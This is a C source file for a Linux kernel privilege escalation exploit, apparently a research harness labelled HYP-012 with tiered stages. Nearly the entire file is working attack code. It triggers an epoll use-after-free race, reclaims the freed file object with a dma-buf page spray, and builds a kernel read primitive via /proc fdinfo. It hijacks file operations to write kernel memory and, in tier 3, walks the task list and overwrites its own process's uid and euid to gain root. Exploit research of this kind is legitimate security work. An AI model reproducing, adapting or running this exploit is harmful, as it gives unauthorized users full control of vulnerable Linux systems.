#include <sys/stat.h>
#include <sys/sysmacros.h>
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/eventfd.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <string.h>
#include <stdint.h>
#include <pthread.h>
#include <sys/mount.h>
#include <sys/resource.h>

struct dma_heap_allocation_data {
    uint64_t len;
    uint32_t fd;
    uint32_t fd_flags;
    uint64_t heap_flags;
};
#define DMA_HEAP_IOCTL_ALLOC _IOWR('H', 0x0, struct dma_heap_allocation_data)

void setup_dmabuf_devnode() {
    mkdir("/dev/dma_heap", 0755);
    int fd = open("/sys/class/dma_heap/system/dev", O_RDONLY);
    if (fd < 0) fd = open("/sys/devices/virtual/dma_heap/system/dev", O_RDONLY);
    if (fd >= 0) {
        char buf[32] = {0};
        int n = read(fd, buf, sizeof(buf) - 1);
        close(fd);
        if (n > 0) {
            buf[n] = 0;
            int maj = 0, min = 0;
            if (sscanf(buf, "%d:%d", &maj, &min) == 2) {
                unlink("/dev/dma_heap/system");
                mknod("/dev/dma_heap/system", S_IFCHR | 0666, makedev(maj, min));
            }
        }
    }
}

int alloc_dmabuf_page() {
    int heap_fd = open("/dev/dma_heap/system", O_RDONLY);
    if (heap_fd < 0) { perror("open dma_heap"); exit(1); }
    struct dma_heap_allocation_data data = { .len = 4096, .fd_flags = O_RDWR | O_CLOEXEC };
    if (ioctl(heap_fd, DMA_HEAP_IOCTL_ALLOC, &data) < 0) { perror("ioctl alloc"); exit(1); }
    close(heap_fd);
    return data.fd;
}

uint64_t aar_read(int epA_fd, uint8_t *fake_file, uint64_t target_addr) {
    *(uint64_t*)(fake_file + 32) = target_addr - 0x40; // f_inode
    char path[256], buf[4096];
    snprintf(path, sizeof(path), "/proc/self/fdinfo/%d", epA_fd);
    int fd = open(path, O_RDONLY);
    if (fd < 0) return 0;
    int n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n > 0) {
        buf[n] = 0;
        char *tfd = strstr(buf, "tfd:");
        if (tfd) {
            char *ptr = strstr(tfd, "ino:");
            if (ptr) return strtoull(ptr + 4, NULL, 16);
        }
    }
    return 0;
}

void fire_gated_write(int ep_fd, uint8_t *victim, uint64_t target_addr) {
    *(uint64_t*)(victim + 40) = 0xffffffc0091231f0; // f_op (swaps_proc_ops)
    *(uint64_t*)(victim + 200) = target_addr - 96;  // private_data
    struct epoll_event evs[1];
    epoll_wait(ep_fd, evs, 1, 0); // Triggers poll()
}

int main(int argc, char **argv) {
    struct rlimit rlim = {65535, 65535};
    setrlimit(RLIMIT_NOFILE, &rlim);

    int tier = (argc > 1) ? atoi(argv[1]) : 1;
    if (tier == 3) prctl(PR_SET_NAME, "t3_harness", 0, 0, 0);

    mount("proc", "/proc", "proc", 0, NULL);
    mount("sysfs", "/sys", "sysfs", 0, NULL);
    mount("devtmpfs", "/dev", "devtmpfs", 0, NULL);

    setup_dmabuf_devnode();
    printf("[*] HYP-012 swaps_poll exploit harness. Tier: %d\n", tier);

    int batch_a[256], batch_b[256];
    for (int i=0; i<256; i++) batch_a[i] = epoll_create1(0);
    int inner = epoll_create1(0);
    for (int i=0; i<256; i++) batch_b[i] = epoll_create1(0);

    int epA = epoll_create1(0);
    int efd = eventfd(0, 0);
    
    struct epoll_event ev = {.events = EPOLLIN, .data.u64 = 0xdeadbeef};
    epoll_ctl(inner, EPOLL_CTL_ADD, efd, &ev);
    epoll_ctl(epA, EPOLL_CTL_ADD, inner, &ev);
    printf("[*] Armed rdllist: inner fd %d added to epA %d with EPOLLIN\n", inner, epA);

    printf("[*] Triggering Stage 1 close(inner) race...\n");
    close(inner);

    for (int i=0; i<256; i++) close(batch_a[i]);
    for (int i=0; i<256; i++) close(batch_b[i]);
    
    printf("[*] Slabs drained. Waiting RCU grace...\n");
    sleep(2);

    int dma_fds[8192];
    uint8_t *fake_files[8192];
    for (int i=0; i<8192; i++) {
        dma_fds[i] = alloc_dmabuf_page();
        fake_files[i] = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, dma_fds[i], 0);
        memset(fake_files[i], 0, 4096);
        *(uint64_t*)(fake_files[i] + 56) = 1; // f_count
        *(uint64_t*)(fake_files[i] + 32) = 0xffffffc00973e258 - 0x40; // f_inode = init_task.comm
    }
    printf("[*] Buddy sprayed 8192 dma-buf pages.\n");

    if (tier == 3) setresuid(1000, 1000, 1000);

    uint64_t initial_val = aar_read(epA, fake_files[0], 0xffffffc00973e258);
    if (initial_val != 0x2f72657070617773) {
        printf("[-] Reclaim failed or oracle broken! Read %lx\n", initial_val);
        return 1;
    }

    int victim_idx = -1;
    for (int i=0; i<8192; i++) {
        *(uint64_t*)(fake_files[i] + 32) = 0xffffffc00973e248 - 0x40; // target init_task.cred
        uint64_t val = aar_read(epA, fake_files[i], 0xffffffc00973e248);
        if (val != 0x2f72657070617773) {
            victim_idx = i;
            break;
        }
        *(uint64_t*)(fake_files[i] + 32) = 0xffffffc00973e258 - 0x40; // restore comm
    }
    if (victim_idx == -1) { printf("[-] Failed to locate victim idx!\n"); return 1; }
    printf("[+] Reclaim SUCCESS at index %d! Oracle calibrated.\n", victim_idx);
    uint8_t *victim = fake_files[victim_idx];

    if (tier == 1) {
        uint64_t ep_dbg_fep_cleared = 0xffffffc00994e920;
        printf("[*] TIER 1: Single gated write to ep_dbg_fep_cleared\n");
        fire_gated_write(epA, victim, ep_dbg_fep_cleared);
        printf("[+] Fired write-0. Check debugfs counter.\n");
    } else if (tier == 3) {
        printf("[*] TIER 3: LPE Walk tasks to find %s\n", "t3_harness");
        uint64_t task_ptr = 0xffffffc00973dac0; // init_task
        while (task_ptr) {
            uint64_t comm_val = aar_read(epA, victim, task_ptr + 0x798); // comm
            if (comm_val == 0x656e7261685f3374) { // "t3_harne"
                uint64_t target_cred = aar_read(epA, victim, task_ptr + 0x788);
                printf("[+] Found target process! task=%lx, cred=%lx\n", task_ptr, target_cred);
                fire_gated_write(epA, victim, target_cred + 4);  // uid
                fire_gated_write(epA, victim, target_cred + 0x14); // euid
                if (getuid() == 0) {
                    printf("[+++] LPE SUCCESS! root shell popped.\n");
                } else {
                    printf("[-] LPE FAILED. uid is %d\n", getuid());
                }
                break;
            }
            task_ptr = aar_read(epA, victim, task_ptr + 0x4d0) - 0x4d0; // tasks.next
            if (task_ptr == 0xffffffc00973dac0) break; // looped
        }
    }
    
    return 0;
}
